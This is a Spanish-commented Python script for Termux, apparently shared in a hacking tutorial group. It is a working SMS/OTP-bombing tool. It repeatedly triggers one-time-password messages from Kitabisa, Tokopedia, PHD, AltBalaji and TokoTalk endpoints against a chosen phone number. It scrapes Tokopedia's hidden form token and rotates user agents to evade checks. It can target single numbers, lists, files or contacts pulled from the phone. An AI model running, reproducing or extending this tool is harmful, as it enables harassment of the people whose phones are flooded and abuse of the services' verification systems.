#!/usr/bin/python
import requests,random,json,time,sys,os,re
# -----------------------------------------------------------
# Creado por ./Kitsune
# Actualización 14 Junio 2021 10:57
# Gracias a FourX, MhankBarBar, Maulana, ITachI
# Underground Science And Termux Tutorial Group
# ---------------------------------------------------------------

# -----------------------COLORES----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# -------------------------------------------------------
# Un Programa en Python que usa Programación Orientada a Objetos
#------------------------Clases------------------------
class spam:

	def __init__(self, numero):
		self.numero = numero

	def spam(self):
		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.numero}')
		if hasil.status_code == 200:
			return f'\x1b[92mSpam kitabisa {self.numero} \033[1;32m¡Éxito!'
		elif hasil.status_code == 500:
			return f'\x1b[91mSpam kitabisa {self.numero} \x1b[91m¡Falló!'

	def tokped(self):
		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
		cabecera = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.numero+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = cabecera).text
		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		formulario = {
			"otp_type" : "116",
			"msisdn" : self.numero,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6"
		}
		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = cabecera, data = formulario).text
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mSpam Tokped {self.numero} \x1b[91m¡Falló!'
		else:
			return f'\x1b[92mSpam Tokped {self.numero} {h}¡Éxito!'

	def phd(self):
		param = {'phone_number':self.numero}
		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			return f'\x1b[92mSpam PHD {self.numero} {h}¡Éxito!'
		else:
			return f'\x1b[91mSpam PHD {self.numero} {m}¡Falló!'

	def balaji(self):
		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
		kod="62"
		ata={
				"country_code":kod,
				"phone_number":self.numero
			}
		head={
			"Content-Length":f"{len(str(ata))}",
			"Accept":"application/json, text/plain, */*",
			"Origin":"https://lite.altbalaji.com",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
			"Content-Type":"application/json;charset=UTF-8",
			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
			"Accept-Encoding":"gzip, deflate, br",
			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
			}
		req=requests.post(urlb,data=json.dumps(ata),headers=head)
		if '{"status":"ok"}' in req.text:
			return f'\x1b[92mSpam BALAJI {self.numero} {h}¡Éxito!'
		else:
			return f'\x1b[92mSpam BALAJI {self.numero} {m}¡Falló!'

	def TokoTalk(self):
		data='{"key":"phone","value":"'+str(self.numero)+'"}'
		head={
			"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
			"content-type":"application/json;charset=UTF-8"
		}
		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
			return f'\x1b[92mSpam TokoTalk {self.numero} {h}¡Éxito!'
		else:
			return f'\x1b[92mSpam TokoTalk {self.numero} {m}¡Falló!'
# ------------------------------------------------------------

# ---------------------------Funciones----------------------------
def repetir():
	while True:
		lan=str(input(k+'\t¿Quieres más? y/n : '+h))
		if( lan == 'y' or lan == 'Y'):
			menu_spam()
		elif(lan == 'n' or lan == 'N'):
			print(p)
			break
		else:
			continue

def cargar_archivo():
	fil=str(input(k+'\tArchivo : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\tTotal de spam : '+h))
		dly=int(input(k+'\tRetraso : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(io)
				if jns == 'ktbs':
					print('\t'+z.spam().__str__())
				elif jns == 'tkpd':
					print('\t'+z.tokped().__str__())
				elif jns == 'blji':
					print('\t'+z.balaji().__str__())
				elif jns == 'smua':
					print('\t'+z.spam().__str__())
					print('\t'+z.tokped().__str__())
					print('\t'+z.balaji().__str__())
					print('\t'+z.phd().__str__())
					print('\t'+z.TokoTalk().__str__())
				elif jns == 'pehd':
					print('\t'+z.phd().__str__())
				elif jns == 'ttk':
					print('\t'+z.TokoTalk().__str__())
				else:
					print()
				time.sleep(dly)
		repetir()
	else:
		print(m+f'\tEl archivo {fil} no existe')

def numero_unico():
	numero=str(input(k+'\tNúmero de teléfono : '+h))
	jm=int(input(k+'\tTotal de spam : '+h))
	dly=int(input(k+'\tRetraso : '+h))
	for oo in range(jm):
		z=spam(numero)
		if jns == 'ktbs':
			print('\t'+z.spam().__str__())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam().__str__())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		else:
			print()
		time.sleep(dly)
	repetir()

def multiple():
	numeros=[]
	jum=int(input(k+'\tCantidad de números : '+h))
	for i in range(jum):
		numeros.append(str(input(k+f'\tNúmero -{i+1} : '+h)))
	spm=int(input(k+'\tTotal de spam : '+h))
	dly=int(input(k+'Retraso : '+h))
	kk=len(numeros)
	for i in range(spm):
		for ss in range(kk):
			z=spam(numeros[ss])
			if jns == 'ktbs':
				print('\t'+z.spam().__str__())
			elif jns == 'tkpd':
				print('\t'+z.tokped())
			elif jns == 'blji':
				print('\t'+z.balaji())
			elif jns == 'smua':
				print('\t'+z.spam().__str__())
				print('\t'+z.tokped())
				print('\t'+z.balaji())
				print('\t'+z.phd())
				print('\t'+z.TokoTalk())
			elif jns == 'pehd':
				print('\t'+z.phd())
			elif jns == 'ttk':
				print('\t'+z.TokoTalk())
			else:
				print()
		time.sleep(dly)
	repetir()

#-------------------------Función Banner-----------------------
def logo():
	os.system('clear')
	autor=m+'  Autor : '+k+'./kitsune'
	return '''
%s╭━┳━╭━╭━╮%s╮        %s╔═╗╔═╗╔═╗╔╦╗
%s┃   ┣▅╋▅┫┃        %s╚═╗╠═╝╠═╣║║║
%s┃ ┃ ╰━╰━━━━━━╮%s   %s╚═╝╩  ╩ ╩╩ ╩
%s╰┳╯         ◢▉◣%s  %s╔═╗╔╦╗╔═╗
%s ╲┃       ▉▉▉%s    %s╚═╗║║║╚═╗
%s ╲┃        ◥▉◤%s   %s╚═╝╩ ╩╚═╝
%s ╲┃   ╭━┳━━━━╯%s   %s╦ ╦╦ ╦╔═╗╔╦╗
%s ╲┣━━━━━━┫%s       %s║║║╠═╣╠═╣ ║
%s ╲┃      ┃%s       %s╚╩╝╩ ╩╩ ╩ ╩
%s''' % (k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,autor)

# -----------------------------------------------------------
def contactos_termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tElige > '+h))-1]['number']
	dly=int(input(u+'\tRetraso > '+h))
	for w in range(int(input(u+'\tTotal de spam : '+h))):
		z=spam(nj)
		if jns == 'ktbs':
			print('\t'+z.spam().__str__())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam().__str__())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		time.sleep(dly)
	repetir()

def menu_principal():
	print(logo())
	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'MODO '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Atrás\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'Número único\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'Múltiples números\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'Cargar números desde archivo\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Seleccionar número de contactos\n'+b+'╠══════════════════════════════')
	pil=str(input(b+'╚══'+m+'〙'+u+'Modo'+m+' ▶ '+h))
	if( pil == '1' or pil == '01'):
		numero_unico()
	elif( pil == '2' or pil == '02'):
		multiple()
	elif( pil == '3' or pil == '03'):
		cargar_archivo()
	elif( pil == '4' or pil == '04'):
		contactos_termux()
	elif( pil == '0' or pil == '00'):
		menu_spam()
	else:
		print(m+'             No lo dejes en blanco')
		time.sleep(2)
		menu_principal()

def menu_spam():
	global jns
	print(logo())
	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'SPAM '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Salir\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'Todos\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'PHD\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'KitaBisa\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Tokopedia\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk (Ilimitado)\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Balaji (Sin +62 o 0)\n'+b+'╠══════════════════════════════')
	while True:
		oy=str(input(b+'╚══'+m+'〙'+u+'Spam'+m+' ▶ '+h))
		if( oy == '1' or oy == '01' ):
			jns='smua'
			break
		elif( oy == '2' or oy == '02' ):
			jns='pehd'
			break
		elif( oy == '3' or oy == '03' ):
			jns='ktbs'
			break
		elif( oy == '4' or oy == '04' ):
			jns='tkpd'
			break
		elif( oy == '5' or oy == '05' ):
			jns='ttk'
			break
		elif( oy == '6' or oy == '06' ):
			jns='blji'
			break
		elif( oy == '0' or oy == '00' ):
			sys.exit()
		else:
			print(m+'             No lo dejes en blanco')
			continue
	menu_principal()

if __name__ == '__main__':
	menu_spam()
